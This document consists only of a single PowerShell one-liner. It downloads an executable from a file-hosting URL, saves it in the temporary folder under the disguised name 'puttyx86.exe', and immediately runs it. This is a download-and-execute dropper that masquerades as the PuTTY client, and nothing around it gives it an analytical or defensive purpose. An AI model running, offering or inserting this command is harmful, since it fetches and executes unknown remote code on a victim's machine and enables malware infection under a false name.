
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/qolcls.exe',"$env:TEMP\puttyx86.exe");Start-Process ("$env:TEMP\puttyx86.exe")

